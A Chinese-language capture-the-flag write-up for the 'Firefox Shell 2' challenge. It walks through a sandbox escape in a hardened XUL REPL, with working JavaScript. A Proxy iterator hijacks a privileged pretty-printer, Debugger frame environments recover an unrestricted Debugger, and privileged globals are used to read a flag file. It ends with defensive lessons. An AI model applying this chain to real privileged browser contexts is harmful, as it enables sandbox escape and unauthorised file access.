# Firefox Shell 2

## 题目简述

第二题与 Firefox Shell 1 使用同一套 XUL REPL，但启动参数增加了 `--hardened`。当目标不是 system principal 时，`.debug` 会从暴露的 `Debugger.prototype` 删除三个危险入口：

```javascript
delete Debugger.prototype.addAllGlobalsAsDebuggees;
delete Debugger.prototype.findAllGlobals;
delete Debugger.prototype.onNewGlobalObject;
```

这阻止了第一题直接枚举 `BackstagePass`。然而用户表达式的返回值仍交给移植自 Node.js 的 privileged pretty-printer。Map 格式化过程会调用对象自定义的 `Symbol.iterator`，由此形成一次从特权格式化栈回调到攻击者 Proxy 的跨 compartment 调用。攻击者可以检查该调用栈和闭包环境，取回未删减的原始 Debugger 构造器。

## 解题过程

### 触发 privileged pretty-printer

先执行 `.debug` 获得受限 Debugger，再创建一个 Map，并用 Proxy 替换它的迭代器：

```javascript
const dbg = new Debugger();
dbg.addDebuggee(window);

const map = new Map([[{}, {}]]);
const originalIterator = Object.getPrototypeOf(map)[Symbol.iterator];

map[Symbol.iterator] = new Proxy(() => {}, {
  apply(target, thisArg, args) {
    // exploit body
    return originalIterator.apply(thisArg, args);
  },
});

map;
```

最后一行让 REPL 打印 `map`。Node 风格 formatter 的 `formatMap` 会调用被替换的迭代器，因而进入 `apply` trap。trap 立即恢复原迭代器，避免递归，并借调用者的 `Function` 构造器取得 formatter 所在 sandbox 的 `globalThis`：

```javascript
const sandbox = arguments.callee.caller.constructor('return globalThis')();
dbg.addDebuggee(sandbox);
```

### 从栈帧闭包取回完整 Debugger

受限 Debugger 仍保留 `addDebuggee`、`getNewestFrame` 和环境变量读取能力。把 formatter sandbox 加为 debuggee 后，从最新栈帧向外遍历到 `formatMap`：

```javascript
let frame = dbg.getNewestFrame();
while (frame && frame.script.displayName !== 'formatMap') {
  frame = frame.older;
}

const getvar = (env, name) => env.find(name).getVariable(name);
const getPromiseDetails = getvar(frame.environment, 'getPromiseDetails');
const deref = getvar(getPromiseDetails.environment, 'deref');
const FullDebugger = getvar(deref.environment, 'Debugger').unsafeDereference();
```

`getPromiseDetails` 和 `deref` 是 formatter 闭包链中的内部函数；`deref` 的环境保存着 privileged 代码使用的原始 `Debugger`。这个构造器的原型没有经过 `.debug` 的删减。

### 复用第一题的特权全局链

用 `FullDebugger` 创建新实例后即可重新调用 `findAllGlobals()`，定位 `BackstagePass`，再以 `executeInGlobal` 读取 `file:///flag` 并通过 `inspect` 输出。该阶段与第一题相同：

```javascript
const full = new FullDebugger();
let backstage;
for (backstage of full.findAllGlobals()) {
  if (backstage.class === 'BackstagePass') break;
}
```

完整官方 payload 最后恢复：

```text
uiuctf{sandbox_escape_but_into_another_sandbox_faa5e91d}
```

## 方法总结

- 核心技巧：用恶意 Map 迭代器劫持 privileged pretty-printer 的格式化流程，再借 Debugger 栈帧环境遍历从闭包中恢复未删减的 Debugger capability。
- 识别信号：低权限对象被高权限 pretty-printer、序列化器或检查器主动调用；加固仅删除公开原型方法，却仍允许添加任意 debuggee、读取栈帧和词法环境。
- 复用要点：跨权限格式化不是纯展示操作，getter、Proxy、iterator、`toString` 都可能执行攻击者代码。修复必须消除跨 principal 的可执行回调，并收回底层调试 capability，而不是仅从一个包装对象上删除几个已知方法。
